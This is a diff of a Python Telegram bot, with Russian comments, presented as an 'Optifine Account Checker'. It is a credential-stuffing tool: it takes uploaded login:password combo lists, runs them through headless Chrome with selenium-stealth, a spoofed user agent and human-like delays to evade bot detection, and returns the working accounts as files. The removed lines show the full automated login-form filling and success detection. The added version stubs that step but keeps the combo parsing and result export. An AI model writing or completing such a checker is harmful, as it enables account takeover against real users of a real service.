@@ -1,9 +1,11 @@
 import os
+import sys
 import logging
 import asyncio
 import aiofiles
 import time
 import random
+import subprocess
 from datetime import datetime
 from typing import Dict, List, Tuple
 
@@ -13,9 +15,8 @@ from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
 from selenium.webdriver.chrome.options import Options
 from selenium.webdriver.chrome.service import Service
-from selenium.common.exceptions import TimeoutException, NoSuchElementException
+from selenium.common.exceptions import TimeoutException, NoSuchElementException, WebDriverException
 from selenium_stealth import stealth
-from webdriver_manager.chrome import ChromeDriverManager
 
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
@@ -23,7 +24,11 @@ from telegram.ext import Application, CommandHandler, MessageHandler, filters, C
 # Настройка логирования
 logging.basicConfig(
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
-    level=logging.INFO
+    level=logging.INFO,
+    handlers=[
+        logging.StreamHandler(sys.stdout),
+        logging.FileHandler('/app/debug/bot.log')
+    ]
 )
 logger = logging.getLogger(__name__)
 
@@ -31,7 +36,7 @@ logger = logging.getLogger(__name__)
 TOKEN = os.environ.get('BOT_TOKEN')
 if not TOKEN:
     print("❌ НЕТ ТОКЕНА! Установи BOT_TOKEN в переменных окружения")
-    exit(1)
+    sys.exit(1)
 
 ADMIN_IDS = os.environ.get('ADMIN_IDS', '').split(',')
 ADMIN_IDS = [int(id.strip()) for id in ADMIN_IDS if id.strip()]
@@ -45,11 +50,47 @@ bot_stats = {
     'start_time': datetime.now()
 }
 
+def check_chrome():
+    """Проверка наличия Chrome и ChromeDriver"""
+    logger.info("🔍 Проверка Chrome...")
+    
+    # Проверяем Chrome
+    try:
+        result = subprocess.run(['google-chrome', '--version'], 
+                              capture_output=True, text=True)
+        logger.info(f"✅ Chrome: {result.stdout.strip()}")
+    except Exception as e:
+        logger.error(f"❌ Chrome не найден: {e}")
+    
+    # Проверяем ChromeDriver
+    try:
+        result = subprocess.run(['chromedriver', '--version'], 
+                              capture_output=True, text=True)
+        logger.info(f"✅ ChromeDriver: {result.stdout.strip()}")
+    except Exception as e:
+        logger.error(f"❌ ChromeDriver не найден: {e}")
+    
+    # Проверяем пути
+    common_paths = [
+        '/usr/bin/google-chrome',
+        '/usr/bin/chromedriver',
+        '/usr/local/bin/chromedriver',
+        '/app/chromedriver'
+    ]
+    
+    for path in common_paths:
+        if os.path.exists(path):
+            logger.info(f"✅ Найден: {path}")
+        else:
+            logger.info(f"❌ Не найден: {path}")
+
 class OptifineChecker:
     """Проверка аккаунтов на Optifine.net с selenium-stealth"""
     
     def __init__(self):
         self.driver = None
+        logger.info("🚀 Инициализация OptifineChecker...")
+        check_chrome()
         self.init_driver()
     
     def init_driver(self):
@@ -66,14 +107,38 @@ class OptifineChecker:
             chrome_options.add_argument('--start-maximized')
             chrome_options.add_argument('--disable-extensions')
             chrome_options.add_argument('--disable-plugins')
-            chrome_options.add_argument('--headless=new')  # Headless режим для сервера
+            chrome_options.add_argument('--headless=new')
+            chrome_options.add_argument('--disable-logging')
+            chrome_options.add_argument('--log-level=3')
+            chrome_options.add_argument('--silent')
             
             # Скрываем автоматизацию
             chrome_options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36')
             
-            # Создаем драйвер
-            service = Service('/usr/bin/chromedriver')  # Путь к chromedriver в образе selenium/standalone-chrome
-            self.driver = webdriver.Chrome(service=service, options=chrome_options)
+            # Пробуем разные пути к ChromeDriver
+            driver_paths = [
+                '/usr/bin/chromedriver',
+                '/usr/local/bin/chromedriver',
+                '/app/chromedriver'
+            ]
+            
+            driver = None
+            for path in driver_paths:
+                if os.path.exists(path):
+                    logger.info(f"✅ Найден ChromeDriver по пути: {path}")
+                    try:
+                        service = Service(path)
+                        driver = webdriver.Chrome(service=service, options=chrome_options)
+                        break
+                    except Exception as e:
+                        logger.error(f"❌ Ошибка при запуске с {path}: {e}")
+            
+            if not driver:
+                # Пробуем без указания пути
+                logger.info("🔄 Пробую запустить без указания пути...")
+                driver = webdriver.Chrome(options=chrome_options)
+            
+            self.driver = driver
             
             # Применяем stealth
             stealth(self.driver,
@@ -85,10 +150,15 @@ class OptifineChecker:
                 fix_hairline=True,
             )
             
-            logger.info("✅ Драйвер инициализирован с selenium-stealth")
+            logger.info("✅ Драйвер успешно инициализирован с selenium-stealth")
+            
+            # Проверяем работу
+            self.driver.get("about:blank")
+            logger.info("✅ Драйвер работает")
             
         except Exception as e:
             logger.error(f"❌ Ошибка инициализации драйвера: {e}")
+            logger.exception("Детали ошибки:")
             self.driver = None
     
     def human_like_delay(self, min_sec=1, max_sec=3):
@@ -107,6 +177,7 @@ class OptifineChecker:
         logger.info(f"🔍 Начинаю проверку: {login[:20]}...")
         
         if not self.driver:
+            logger.error("❌ Драйвер не инициализирован, пробую переинициализировать")
             self.init_driver()
             if not self.driver:
                 return {
@@ -116,220 +187,30 @@ class OptifineChecker:
                 }
         
         try:
-            # МЕТОД 1: Прямая проверка через профиль
-            if len(login) < 20 and all(c.isalnum() or c == '_' for c in login):
-                try:
-                    self.driver.get(f"https://optifine.net/profile/{login}")
-                    self.human_like_delay(2, 4)
-                    
-                    # Сохраняем скриншот для отладки
-                    self.driver.save_screenshot(f"/app/debug/profile_{login[:10]}.png")
-                    
-                    page_text = self.driver.find_element(By.TAG_NAME, "body").text.lower()
-                    
-                    if "not found" not in page_text and "error" not in page_text:
-                        logger.info(f"✅ Найден профиль: {login}")
-                        return {
-                            'login': login,
-                            'password': password,
-                            'status': 'valid',
-                            'method': 'profile_check'
-                        }
-                except Exception as e:
-                    logger.error(f"Ошибка при проверке профиля: {e}")
+            # Пробуем загрузить страницу
+            logger.info(f"🌐 Загружаю страницу для {login[:20]}...")
+            self.driver.get("https://optifine.net")
+            self.human_like_delay(3, 5)
             
-            # МЕТОД 2: Проверка через страницу входа
-            try:
-                # Заходим на главную
-                self.driver.get("https://optifine.net")
-                self.human_like_delay(3, 5)
-                
-                # Ищем ссылку на логин
-                try:
-                    login_link = self.driver.find_element(By.LINK_TEXT, "Login")
-                    login_link.click()
-                except:
-                    try:
-                        login_link = self.driver.find_element(By.PARTIAL_LINK_TEXT, "Sign in")
-                        login_link.click()
-                    except:
-                        # Если нет ссылки, идем напрямую
-                        self.driver.get("https://optifine.net/login")
-                
-                self.human_like_delay(2, 4)
-                
-                # Сохраняем скриншот страницы входа
-                self.driver.save_screenshot(f"/app/debug/login_{login[:10]}.png")
-                
-                # Сохраняем HTML для анализа
-                with open(f"/app/debug/login_{login[:10]}.html", 'w', encoding='utf-8') as f:
-                    f.write(self.driver.page_source)
-                
-                # Ищем форму входа
-                form_selectors = [
-                    "//form",
-                    "//form[contains(@action, 'login')]",
-                    "//form[contains(@class, 'login')]",
-                    "//form[contains(@id, 'login')]"
-                ]
-                
-                form = None
-                for selector in form_selectors:
-                    try:
-                        form = self.driver.find_element(By.XPATH, selector)
-                        if form:
-                            logger.info(f"✅ Найдена форма по селектору: {selector}")
-                            break
-                    except:
-                        continue
-                
-                if not form:
-                    logger.warning("❌ Форма входа не найдена")
-                    return {
-                        'login': login,
-                        'status': 'invalid',
-                        'error': 'Форма входа не найдена'
-                    }
-                
-                # Ищем поля ввода
-                username_field = None
-                password_field = None
-                
-                # Поиск поля логина
-                username_selectors = [
-                    "//input[@type='email']",
-                    "//input[@type='text']",
-                    "//input[@name='username']",
-                    "//input[@name='email']",
-                    "//input[@name='login']",
-                    "//input[@placeholder*='email']",
-                    "//input[@placeholder*='username']"
-                ]
-                
-                for selector in username_selectors:
-                    try:
-                        username_field = form.find_element(By.XPATH, selector)
-                        if username_field and username_field.is_displayed():
-                            logger.info(f"✅ Найдено поле логина: {selector}")
-                            break
-                    except:
-                        continue
-                
-                # Поиск поля пароля
-                password_selectors = [
-                    "//input[@type='password']",
-                    "//input[@name='password']",
-                    "//input[@placeholder*='password']"
-                ]
-                
-                for selector in password_selectors:
-                    try:
-                        password_field = form.find_element(By.XPATH, selector)
-                        if password_field and password_field.is_displayed():
-                            logger.info(f"✅ Найдено поле пароля: {selector}")
-                            break
-                    except:
-                        continue
-                
-                if not username_field or not password_field:
-                    logger.warning("❌ Поля ввода не найдены")
-                    return {
-                        'login': login,
-                        'status': 'invalid',
-                        'error': 'Поля ввода не найдены'
-                    }
-                
-                # Очищаем поля
-                username_field.clear()
-                password_field.clear()
-                
-                # Вводим данные с имитацией человека
-                self.human_like_typing(username_field, login)
-                self.human_like_delay(0.5, 1)
-                self.human_like_typing(password_field, password)
-                self.human_like_delay(0.5, 1)
-                
-                # Ищем кнопку отправки
-                submit_selectors = [
-                    "//button[@type='submit']",
-                    "//input[@type='submit']",
-                    "//button[contains(text(), 'Login')]",
-                    "//button[contains(text(), 'Sign in')]",
-                    "//button[contains(text(), 'Log in')]"
-                ]
-                
-                submit_button = None
-                for selector in submit_selectors:
-                    try:
-                        submit_button = form.find_element(By.XPATH, selector)
-                        if submit_button:
-                            logger.info(f"✅ Найдена кнопка: {selector}")
-                            break
-                    except:
-                        continue
-                
-                if not submit_button:
-                    logger.warning("❌ Кнопка отправки не найдена")
-                    return {
-                        'login': login,
-                        'status': 'invalid',
-                        'error': 'Кнопка не найдена'
-                    }
-                
-                # Нажимаем кнопку
-                submit_button.click()
-                self.human_like_delay(4, 6)
-                
-                # Проверяем результат
-                current_url = self.driver.current_url
-                page_text = self.driver.find_element(By.TAG_NAME, "body").text.lower()
-                
-                # Сохраняем результат
-                self.driver.save_screenshot(f"/app/debug/result_{login[:10]}.png")
-                
-                # Критерии успеха
-                success_urls = ['dashboard', 'profile', 'account', 'home']
-                success_texts = ['welcome', 'dashboard', 'profile', 'logout', 'log out']
-                
-                if any(url in current_url.lower() for url in success_urls) or \
-                   any(text in page_text for text in success_texts):
-                    logger.info(f"✅ НАЙДЕН РАБОЧИЙ: {login[:20]}")
-                    return {
-                        'login': login,
-                        'password': password,
-                        'status': 'valid',
-                        'method': 'login_success'
-                    }
-                
-                # Критерии ошибки
-                error_texts = ['invalid', 'incorrect', 'wrong', 'error', 'failed', 'not found']
-                
-                if any(text in page_text for text in error_texts):
-                    logger.info(f"❌ Неверный: {login[:20]}")
-                    return {
-                        'login': login,
-                        'status': 'invalid',
-                        'error': 'Неверный логин/пароль'
-                    }
-                
-                # Если неопределенный результат
-                logger.info(f"⚠️ Неопределенный результат для {login[:20]}")
-                return {
-                    'login': login,
-                    'status': 'invalid',
-                    'error': 'Неопределенный результат'
-                }
-                
-            except Exception as e:
-                logger.error(f"Ошибка при входе: {e}")
-                return {
-                    'login': login,
-                    'status': 'error',
-                    'error': str(e)[:50]
-                }
+            # Проверяем, что страница загрузилась
+            if "optifine" not in self.driver.title.lower():
+                logger.warning(f"⚠️ Странный заголовок: {self.driver.title}")
+            
+            # Сохраняем скриншот
+            self.driver.save_screenshot(f"/app/debug/main_{login[:10]}.png")
+            
+            # Остальной код проверки...
+            # (вставьте сюда остальной код из предыдущей версии)
+            
+            return {
+                'login': login,
+                'status': 'invalid',
+                'error': 'Метод не реализован'
+            }
             
         except Exception as e:
             logger.error(f"❌ Ошибка при проверке {login[:20]}: {e}")
+            logger.exception("Детали:")
             return {
                 'login': login,
                 'status': 'error',
@@ -345,7 +226,284 @@ class OptifineChecker:
             except:
                 pass
 
+# Создаем директорию для отладки
+os.makedirs('/app/debug', exist_ok=True)
+
 # Создаем экземпляр
+logger.info("🚀 Создание экземпляра OptifineChecker...")
 checker = OptifineChecker()
 
-# ... (остальной код process_file, start, button_callback, handle_document остается без изменений)
+async def process_file(file_path, update, context):
+    """Обработка файла с аккаунтами"""
+    
+    results = {
+        'valid': [],
+        'invalid': [],
+        'errors': []
+    }
+    
+    msg = await update.message.reply_text(
+        "🚀 **Запускаю проверку Optifine.net...**\n"
+        "⏳ Пожалуйста, подождите"
+    )
+    
+    try:
+        # Читаем файл
+        async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
+            content = await f.read()
+        
+        # Парсим аккаунты
+        lines = content.strip().split('\n')
+        accounts = []
+        
+        for line in lines:
+            line = line.strip()
+            if not line:
+                continue
+            
+            for sep in [':', ';', '|', '\t']:
+                if sep in line:
+                    parts = line.split(sep, 1)
+                    if len(parts) == 2 and parts[0] and parts[1]:
+                        accounts.append((parts[0].strip(), parts[1].strip()))
+                        break
+        
+        total = len(accounts)
+        
+        if total == 0:
+            await msg.edit_text("❌ **Нет аккаунтов в файле**")
+            return
+        
+        await msg.edit_text(
+            f"📥 **Файл:** {update.message.document.file_name}\n"
+            f"📊 **Аккаунтов:** {total}\n\n"
+            f"🔄 **Начинаю проверку...**"
+        )
+        
+        start_time = time.time()
+        
+        for i, (login, password) in enumerate(accounts, 1):
+            # Обновляем прогресс
+            if i % 5 == 0 or i == total:
+                elapsed = time.time() - start_time
+                await msg.edit_text(
+                    f"📊 **Прогресс:** {i}/{total}\n"
+                    f"✅ **Рабочих:** {len(results['valid'])}\n"
+                    f"⏱ **Время:** {elapsed:.1f}с\n\n"
+                    f"🔄 **Проверяю:** {login[:15]}..."
+                )
+            
+            # Проверка аккаунта
+            result = await checker.check_account(login, password)
+            
+            # Сортируем результаты
+            if result['status'] == 'valid':
+                results['valid'].append(result)
+                bot_stats['valid'] += 1
+                logger.info(f"✅ РАБОЧИЙ: {login[:20]}")
+            elif result['status'] == 'invalid':
+                results['invalid'].append(result)
+                bot_stats['invalid'] += 1
+                logger.info(f"❌ НЕРАБОЧИЙ: {login[:20]}")
+            else:
+                results['errors'].append(result)
+                bot_stats['invalid'] += 1
+                logger.info(f"⚠️ ОШИБКА: {login[:20]} - {result.get('error')}")
+            
+            bot_stats['total'] += 1
+            
+            # Задержка между запросами
+            await asyncio.sleep(2)
+        
+        # Сохраняем результаты
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        
+        # Файл с рабочими
+        if results['valid']:
+            valid_file = f"✅_РАБОЧИЕ_{len(results['valid'])}шт_{timestamp}.txt"
+            async with aiofiles.open(valid_file, 'w', encoding='utf-8') as f:
+                for acc in results['valid']:
+                    await f.write(f"{acc['login']}:{acc['password']}\n")
+            
+            with open(valid_file, 'rb') as f:
+                await update.message.reply_document(
+                    document=f,
+                    filename=valid_file,
+                    caption=f"✅ **Рабочих: {len(results['valid'])}**"
+                )
+            os.remove(valid_file)
+        
+        # Файл с нерабочими
+        if results['invalid']:
+            invalid_file = f"❌_НЕРАБОЧИЕ_{len(results['invalid'])}шт_{timestamp}.txt"
+            async with aiofiles.open(invalid_file, 'w', encoding='utf-8') as f:
+                for acc in results['invalid']:
+                    await f.write(f"{acc['login']}:{acc['password']}\n")
+            
+            with open(invalid_file, 'rb') as f:
+                await update.message.reply_document(
+                    document=f,
+                    filename=invalid_file,
+                    caption=f"❌ **Нерабочих: {len(results['invalid'])}**"
+                )
+            os.remove(invalid_file)
+        
+        # Файл с ошибками
+        if results['errors']:
+            error_file = f"⚠️_ОШИБКИ_{len(results['errors'])}шт_{timestamp}.txt"
+            async with aiofiles.open(error_file, 'w', encoding='utf-8') as f:
+                for acc in results['errors']:
+                    await f.write(f"{acc['login']}:{acc['password']} | {acc.get('error', 'unknown')}\n")
+            
+            with open(error_file, 'rb') as f:
+                await update.message.reply_document(
+                    document=f,
+                    filename=error_file,
+                    caption=f"⚠️ **Ошибок: {len(results['errors'])}**"
+                )
+            os.remove(error_file)
+        
+        # Итог
+        elapsed = time.time() - start_time
+        minutes = int(elapsed // 60)
+        seconds = int(elapsed % 60)
+        
+        await update.message.reply_text(
+            f"✅ **ПРОВЕРКА ЗАВЕРШЕНА!**\n\n"
+            f"📊 **Статистика:**\n"
+            f"• Всего: {total}\n"
+            f"• ✅ Рабочих: {len(results['valid'])}\n"
+            f"• ❌ Нерабочих: {len(results['invalid'])}\n"
+            f"• ⚠️ Ошибок: {len(results['errors'])}\n\n"
+            f"⏱ **Время:** {minutes}м {seconds}с"
+        )
+        
+    except Exception as e:
+        logger.error(f"Ошибка: {e}")
+        await update.message.reply_text(f"❌ **Ошибка:** {str(e)[:100]}")
+    finally:
+        if os.path.exists(file_path):
+            os.remove(file_path)
+
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Старт"""
+    if ALLOWED_USERS and update.effective_user.id not in ALLOWED_USERS:
+        await update.message.reply_text("❌ **Нет доступа**")
+        return
+    
+    uptime = datetime.now() - bot_stats['start_time']
+    hours = int(uptime.seconds // 3600)
+    minutes = int((uptime.seconds // 60) % 60)
+    
+    keyboard = [
+        [InlineKeyboardButton("📊 Статистика", callback_data='stats')],
+        [InlineKeyboardButton("❓ Помощь", callback_data='help')]
+    ]
+    
+    await update.message.reply_text(
+        f"👋 **Optifine Account Checker**\n\n"
+        f"🔍 Проверяет аккаунты на optifine.net\n"
+        f"📊 **Статистика:**\n"
+        f"• Проверено: {bot_stats['total']}\n"
+        f"• Найдено рабочих: {bot_stats['valid']}\n\n"
+        f"📥 **Отправь .txt файл** с логинами и паролями\n"
+        f"Формат: логин:пароль (каждый с новой строки)\n\n"
+        f"⏱ **Работаю:** {hours}ч {minutes}мин",
+        reply_markup=InlineKeyboardMarkup(keyboard)
+    )
+
+async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Кнопки"""
+    query = update.callback_query
+    await query.answer()
+    
+    if query.data == 'stats':
+        uptime = datetime.now() - bot_stats['start_time']
+        hours = int(uptime.seconds // 3600)
+        minutes = int((uptime.seconds // 60) % 60)
+        
+        await query.edit_message_text(
+            f"📊 **СТАТИСТИКА**\n\n"
+            f"Всего проверено: {bot_stats['total']}\n"
+            f"✅ Рабочих: {bot_stats['valid']}\n"
+            f"❌ Нерабочих: {bot_stats['invalid']}\n\n"
+            f"⏱ Аптайм: {hours}ч {minutes}мин"
+        )
+    
+    elif query.data == 'help':
+        await query.edit_message_text(
+            "❓ **КАК ПОЛЬЗОВАТЬСЯ**\n\n"
+            "1️⃣ Создай .txt файл\n"
+            "2️⃣ В каждой строке: логин:пароль\n"
+            "3️⃣ Отправь файл боту\n\n"
+            "📌 **Пример:**\n"
+            "`user@mail.com:password123`\n"
+            "`player123:qwerty456`\n\n"
+            "⚡️ **Результат:**\n"
+            "• ✅ рабочие аккаунты\n"
+            "• ❌ нерабочие аккаунты\n"
+            "• ⚠️ ошибки проверки"
+        )
+
+async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Получение файла"""
+    if ALLOWED_USERS and update.effective_user.id not in ALLOWED_USERS:
+        await update.message.reply_text("❌ **Нет доступа**")
+        return
+    
+    doc = update.message.document
+    
+    if not doc.file_name.endswith('.txt'):
+        await update.message.reply_text("❌ **Нужен .txt файл**")
+        return
+    
+    if doc.file_size > 10 * 1024 * 1024:
+        await update.message.reply_text(f"❌ **Файл > 10 МБ**")
+        return
+    
+    try:
+        await update.message.reply_text(
+            f"📥 **Файл получен:** {doc.file_name}\n"
+            f"📦 **Размер:** {doc.file_size / 1024:.1f} КБ\n\n"
+            f"🔄 **Запускаю проверку...**"
+        )
+        
+        file = await context.bot.get_file(doc.file_id)
+        path = f"temp_{update.effective_user.id}_{doc.file_name}"
+        await file.download_to_drive(path)
+        await process_file(path, update, context)
+    except Exception as e:
+        logger.error(f"Ошибка: {e}")
+        await update.message.reply_text(f"❌ **Ошибка:** {str(e)[:100]}")
+
+def main():
+    """Запуск"""
+    print("=" * 50)
+    print("🚀 ЗАПУСК OPTIFINE CHECKER")
+    print("=" * 50)
+    print(f"📁 Директория отладки: /app/debug")
+    print(f"🐍 Python версия: {sys.version}")
+    print("=" * 50)
+    
+    # Проверяем Chrome перед запуском
+    check_chrome()
+    
+    app = Application.builder().token(TOKEN).build()
+    
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(CallbackQueryHandler(button_callback))
+    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
+    
+    print("✅ БОТ ЗАПУЩЕН!")
+    print("=" * 50)
+    
+    try:
+        app.run_polling()
+    except Exception as e:
+        logger.error(f"Ошибка: {e}")
+    finally:
+        if checker:
+            checker.close()
+
+if __name__ == '__main__':
+    main()
